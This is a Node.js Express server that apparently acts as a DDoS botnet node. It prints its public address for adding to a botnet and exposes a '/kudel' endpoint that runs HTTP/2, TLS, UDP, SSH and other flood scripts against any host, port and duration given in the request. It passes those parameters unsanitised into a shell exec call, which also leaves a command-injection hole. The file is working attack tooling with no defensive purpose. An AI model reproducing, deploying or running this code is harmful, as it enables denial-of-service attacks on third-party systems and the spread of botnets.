const express = require('express');
const { exec } = require('child_process');
const url = require('url');
const cors = require('cors');
const app = express();
const port = process.env.PORT || process.env.SERVER_PORT || 3000;

app.use(cors());
app.use(express.json()); // Untuk memproses body JSON
app.use(express.urlencoded({ extended: true }));

async function fetchData() {
    const response = await fetch('https://httpbin.org/get');
    const data = await response.json();
    console.log(`Copy This Add To Botnet -> http://${data.origin}:${port}`);
    return data
}
app.get('/', (req, res) => {
    res.send('index.html'); //Endpoint "/"
});
app.get('/kudel', (req, res) => {
    const { host, port: targetPort, time, methods } = req.query;

    if (!host || !targetPort || !time || !methods) {
        return res.status(400).json({
            error: 'Missing required parameters (host, port, time, methods)'
        });
    }

    console.log(`Received attack request: Method ${methods}, Target ${host}, Duration ${time}s`);

    // Validasi metode serangan
    const attackMethods = {
        'H2': `./lib/cache/h2.js ${host} ${time} 45 12 proxy.txt`,
        'TLS': `./lib/cache/tls.js ${host} ${time} 32 8 proxy.txt`,
        'FLOOD': `./lib/cache/flood.js ${host} ${time} 56 12 proxy.txt`,
        'MIX': `./lib/cache/mix.js ${host} ${time} 12 45 proxy.txt -v 3`,
        'SKIBIDI': `./lib/cache/skibidi.js ${host} ${time}`,
        'UDP': `./lib/cache/udp.js ${host} ${targetPort} ${time}`,
        'SSH': `./lib/cache/ssh.js ${host} ${targetPort} root ${time}`
    };

    const selectedMethod = attackMethods[methods];

    if (selectedMethod) {
        res.status(200).json({
            message: 'API request received. Executing script shortly.',
            target: host,
            time,
            methods
        });

        exec(`node ${selectedMethod}`, (error, stdout, stderr) => {
            if (error) {
                console.error(`Execution error: ${error}`);
                return;
            }
            console.log(`Executed: ${selectedMethod}`);
        });
    } else {
        return res.status(400).json({ error: `Unsupported method: ${methods}` });
    }
});

app.listen(port, () => {
    fetchData()
    console.log(`Server listening on port ${port}`);
});
